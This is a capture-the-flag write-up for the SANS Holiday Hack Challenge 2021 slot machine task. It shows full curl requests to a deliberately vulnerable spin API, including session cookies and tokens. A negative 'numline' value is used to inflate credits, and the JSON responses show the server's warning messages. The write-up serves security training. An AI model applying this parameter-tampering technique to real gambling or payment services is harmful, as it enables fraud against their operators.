# Writeup for SANS Holiday Hack Challenge 2021 – Jack’s Back! featuring KringleCon 4: Calling Birds
## 4. Slot Machine Investigation
### 4.0. Description
Difficulty: :christmas_tree::christmas_tree:   
Test the security of Jack Frost's [slot machines](https://slots.jackfrosttower.com/). What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help.

### 4.1. [Side Challenge - Logic Munchers](/04.%20Slot%20Machine%20Investigation/04.01.%20Side%20Challenge%20-%20Logic%20Munchers/README.md)

### 4.2. Hints
**Intercepting Proxies** - *Noel Boetie*: “Web application testers can use tools like [Burp Suite](https://portswigger.net/burp/communitydownload) or even right in the browser with Firefox's [Edit and Resend](https://itectec.com/superuser/how-to-edit-parameters-sent-through-a-form-on-the-firebug-console/) feature.”  
**Parameter Tampering** - *Noel Boetie*: “It seems they're susceptible to [parameter tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering).”

### 4.3. Solution
Playing around with parameters in the requests it is possible to identify that the `spin` API is susceptible to parameter tampering. 

The request for a spin is:
```bash
curl 'https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin'   -H 'authority: slots.jackfrosttower.com'   -H 'pragma: no-cache'   -H 'cache-control: no-cache'   -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"'   -H 'accept: application/json'   -H 'content-type: application/x-www-form-urlencoded'   -H 'sec-ch-ua-mobile: ?0'   -H 'x-ncash-token: eab79bec-5017-43f9-899a-4b1bddc1644c'   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'   -H 'sec-ch-ua-platform: "Windows"'   -H 'origin: https://slots.jackfrosttower.com'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-dest: empty'   -H 'referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html'   -H 'accept-language: en-US,en;q=0.9,it;q=0.8'   -H 'cookie: XSRF-TOKEN=eyJpdiI6IjB5N2hVOWcvTUdYZ3BWd3pxU1dzYmc9PSIsInZhbHVlIjoiTGI3SURSM1NsTW10YUtQeC84T0pVelRaRjI2YWxFWk5JYlRscEovUXFKem1tdWhaK1pUS3BxMkJPRExCMzNPYUFINFZDd29BM3E5TnBrdEh5L01LRDF5ZG1HZjdTanNsRGVxZlg3cEVmZnBKSHFNWlZJMFMzSGVEWnMrbmRoeHQiLCJtYWMiOiJhZDkyZDIzM2UzYzMxMDQ1MDcwMTNkMTU2ODVhMWMyNzgzODBjYWU0OGE1ZTEzNzkzODI4MDZhNjhiZDU5Yzc2IiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6IkRpdFM3QjdxS0N4dThxRGdSVlZLemc9PSIsInZhbHVlIjoiSnVhbGtHZVhkTTd3ZHEzNkNkWkgzL3dMbEJ0OVdzZEh4RXoyVXlLM2ovSDJsM2hUQkdRUFc3TlJNRUY4YjBZTlpBQ000Z2g1RnNPdTh5MjNXTVo3N3ZEZFQwRmRueDhuY0RiRzNkbmUydkJYY2w3RUQ2WmRiYzNlZXZkRmFHZXkiLCJtYWMiOiJhMDkzYjBlODZhMzQyYThlNDM2M2I1OTk0M2I3NDdiOGMyZjY4OGM3NjUzM2EzMGMzYjg3ZTk4NTNlOTE0NTNhIiwidGFnIjoiIn0%3D'   --data-raw 'betamount=1&numline=20&cpl=0.1'   --compressed
```
```js
{
  "success": true,
  "data": {
    "credit": 93,
    "jackpot": 0,
    "free_spin": 0,
    "free_num": 0,
    "scaler": 0,
    "num_line": 20,
    "bet_amount": 1,
    "pull": {
      "WinAmount": 0,
      "FreeSpin": 0,
      "WildFixedIcons": [],
      "HasJackpot": false,
      "HasScatter": false,
      "WildColumIcon": "",
      "ScatterPrize": 0,
      "SlotIcons": [
        "icon9",
        "icon9",
        "icon5",
        "wild",
        "icon9",
        "icon6",
        "icon2",
        "icon6",
        "icon4",
        "icon9",
        "icon10",
        "icon4",
        "icon5",
        "wild",
        "icon6"
      ],
      "ActiveIcons": [],
      "ActiveLines": []
    },
    "response": "Keep playing!"
  },
  "message": "Spin success"
}
```

Setting the `numline` parameter to a negative number guarantees to always win:
```bash
curl 'https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin'   -H 'authority: slots.jackfrosttower.com'   -H 'pragma: no-cache'   -H 'cache-control: no-cache'   -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"'   -H 'accept: application/json'   -H 'content-type: application/x-www-form-urlencoded'   -H 'sec-ch-ua-mobile: ?0'   -H 'x-ncash-token: eab79bec-5017-43f9-899a-4b1bddc1644c'   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'   -H 'sec-ch-ua-platform: "Windows"'   -H 'origin: https://slots.jackfrosttower.com'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-dest: empty'   -H 'referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html'   -H 'accept-language: en-US,en;q=0.9,it;q=0.8'   -H 'cookie: XSRF-TOKEN=eyJpdiI6IjB5N2hVOWcvTUdYZ3BWd3pxU1dzYmc9PSIsInZhbHVlIjoiTGI3SURSM1NsTW10YUtQeC84T0pVelRaRjI2YWxFWk5JYlRscEovUXFKem1tdWhaK1pUS3BxMkJPRExCMzNPYUFINFZDd29BM3E5TnBrdEh5L01LRDF5ZG1HZjdTanNsRGVxZlg3cEVmZnBKSHFNWlZJMFMzSGVEWnMrbmRoeHQiLCJtYWMiOiJhZDkyZDIzM2UzYzMxMDQ1MDcwMTNkMTU2ODVhMWMyNzgzODBjYWU0OGE1ZTEzNzkzODI4MDZhNjhiZDU5Yzc2IiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6IkRpdFM3QjdxS0N4dThxRGdSVlZLemc9PSIsInZhbHVlIjoiSnVhbGtHZVhkTTd3ZHEzNkNkWkgzL3dMbEJ0OVdzZEh4RXoyVXlLM2ovSDJsM2hUQkdRUFc3TlJNRUY4YjBZTlpBQ000Z2g1RnNPdTh5MjNXTVo3N3ZEZFQwRmRueDhuY0RiRzNkbmUydkJYY2w3RUQ2WmRiYzNlZXZkRmFHZXkiLCJtYWMiOiJhMDkzYjBlODZhMzQyYThlNDM2M2I1OTk0M2I3NDdiOGMyZjY4OGM3NjUzM2EzMGMzYjg3ZTk4NTNlOTE0NTNhIiwidGFnIjoiIn0%3D'   --data-raw 'betamount=1&numline=-20&cpl=0.1'   --compressed
```
```js
{
  "success": true,
  "data": {
    "credit": 99,
    "jackpot": 0,
    "free_spin": 0,
    "free_num": 0,
    "scaler": 0,
    "num_line": -20,
    "bet_amount": 1,
    "pull": {
      "WinAmount": 0,
      "FreeSpin": 0,
      "WildFixedIcons": [],
      "HasJackpot": false,
      "HasScatter": false,
      "WildColumIcon": "",
      "ScatterPrize": 0,
      "SlotIcons": [
        "scatter",
        "icon4",
        "icon6",
        "wild",
        "icon1",
        "icon6",
        "scatter",
        "icon1",
        "icon6",
        "icon4",
        "icon9",
        "icon8",
        "icon4",
        "icon1",
        "icon10"
      ],
      "ActiveIcons": [],
      "ActiveLines": []
    },
    "response": "Keep playing!"
  },
  "message": "Spin success"
}
```

Over a certain amount (presumably 500 credits), the system starts complaining with the message `You won... but something looks suspicious to me.` but does not actually block further tampered requests:
```js
{
  "success": true,
  "data": {
    "credit": 518,
    "jackpot": 0,
    "free_spin": 0,
    "free_num": 0,
    "scaler": 0,
    "num_line": -20,
    "bet_amount": 10,
    "pull": {
      "WinAmount": 0,
      "FreeSpin": 0,
      "WildFixedIcons": [],
      "HasJackpot": false,
      "HasScatter": false,
      "WildColumIcon": "",
      "ScatterPrize": 0,
      "SlotIcons": [
        "icon6",
        "wild",
        "icon7",
        "icon9",
        "icon6",
        "icon6",
        "wild",
        "icon4",
        "icon3",
        "icon2",
        "icon10",
        "icon8",
        "icon3",
        "icon8",
        "icon8"
      ],
      "ActiveIcons": [],
      "ActiveLines": []
    },
    "response": "You won... but something looks suspicious to me."
  },
  "message": "Spin success"
}
```

When the amount gets greater than 1000 then the message becomes `I'm going to have some bouncer trolls bounce you right out of this casino!`, which is the answer for this challenge:
```js
{
  "success": true,
  "data": {
    "credit": 1518,
    "jackpot": 0,
    "free_spin": 0,
    "free_num": 0,
    "scaler": 0,
    "num_line": -20,
    "bet_amount": 500,
    "pull": {
      "WinAmount": 0,
      "FreeSpin": 0,
      "WildFixedIcons": [],
      "HasJackpot": false,
      "HasScatter": false,
      "WildColumIcon": "",
      "ScatterPrize": 0,
      "SlotIcons": [
        "icon10",
        "icon5",
        "icon9",
        "icon3",
        "icon4",
        "icon2",
        "icon1",
        "icon5",
        "icon8",
        "icon5",
        "scatter",
        "icon4",
        "icon6",
        "icon6",
        "icon10"
      ],
      "ActiveIcons": [],
      "ActiveLines": []
    },
    "response": "I'm going to have some bouncer trolls bounce you right out of this casino!"
  },
  "message": "Spin success"
}
```

The answer: `I'm going to have some bouncer trolls bounce you right out of this casino!`

---
### 4.1. [Side Challenge - Logic Munchers](/04.%20Slot%20Machine%20Investigation/04.01.%20Side%20Challenge%20-%20Logic%20Munchers/README.md)
## 5. [Strange USB Device](/05.%20Strange%20USB%20Device/README.md)
### 5.1. [Side Challenge - IPv6 Sandbox](/05.%20Strange%20USB%20Device/05.01.%20Side%20Challenge%20-%20IPv6%20Sandbox/README.md)
## 6. [Shellcode Primer](/06.%20Shellcode%20Primer/README.md)
### 6.1. [Side Challenge - Holiday Hero](/06.%20Shellcode%20Primer/06.01.%20Side%20Challenge%20-%20Holiday%20Hero/README.md)
## 7. [Printer Exploitation](/07.%20Printer%20Exploitation/README.md)
## 8. [Kerberoasting on an Open Fire](/08.%20Kerberoasting%20on%20an%20Open%20Fire/README.md)
### 8.1. [Side Challenge - HoHo … No](/08.%20Kerberoasting%20on%20an%20Open%20Fire/08.01.%20Side%20Challenge%20-%20HoHo%20…%20No/README.md)
## 9. [Splunk!](/09.%20Splunk!/README.md)
### 9.1. [Side Challenge - Yara Analysis](/09.%20Splunk!/09.01.%20Yara%20Analisys/README.md)
## 10. [Now Hiring!](/10.%20Now%20Hiring!/README.md)
### 10.1. [Side Challenge - IMDS Exploration](/10.%20Now%20Hiring!/10.01%20IMDS%20Exploration/README.md)
## 11. [Customer Complaint Analysis](/11.%20Customer%20Complaint%20Analysis/README.md)
### 11.1. [Side Challenge - Strace Ltrace Retrace](/11.%20Customer%20Complaint%20Analysis/11.01%20Side%20Challenge%20-%20Strace%20Ltrace%20Retrace/README.md)
## 12. [Frost Tower Website Checkup](/12.%20Frost%20Tower%20Website%20Checkup/README.md)
### 12.1. [Side Challenge - The Elf C0de Python Edition](/12.%20Frost%20Tower%20Website%20Checkup/12.01.%20Side%20Challenge%20-%20The%20Elf%20C0de%20Python%20Edition/README.md)
## 13. [FPGA Programming](/13.%20FPGA%20Programming/README.md)
### 13.1. [Side Challenge - Frostavator](/13.%20FPGA%20Programming/13.01.%20Side%20Challenge%20-%20Frostavator/README.md)
## 14. [Bonus! Blue Log4Jack](/14.%20Bonus!%20Blue%20Log4Jack/README.md)
## 15. [Bonus! Red Log4Jack](/15.%20Bonus!%20Red%20Log4Jack/README.md)
## 16. [That’s how Jack came from space](/README.md#16-thats-how-jack-came-from-space)
## 17. [Narrative](/README.md#17-narrative)
## 18. [Conclusions](/README.md#18-conclusions)
---
## 0. [windovo\\thedead> whoami](/README.md)
## 1. [KringleCon Orientation](/01.%20KringleCon%20Orientation/README.md)
## 2. [Where in the World is Caramel Santiaigo?](/02.%20Where%20in%20the%20World%20is%20Caramel%20Santiaigo/README.md)
### 2.1. [Side Challenge - Exif Metadata](/02.%20Where%20in%20the%20World%20is%20Caramel%20Santiaigo/02.01.%20Side%20Challenge%20-%20Exif%20Metadata/README.md)
## 3. [Thaw Frost Tower's Entrance](/03.%20Thaw%20Frost%20Tower's%20Entrance/README.md)
### 3.1. [Side Challenge - Grepping for Gold](/03.%20Thaw%20Frost%20Tower's%20Entrance/03.01.%20Grepping%20for%20Gold/README.md)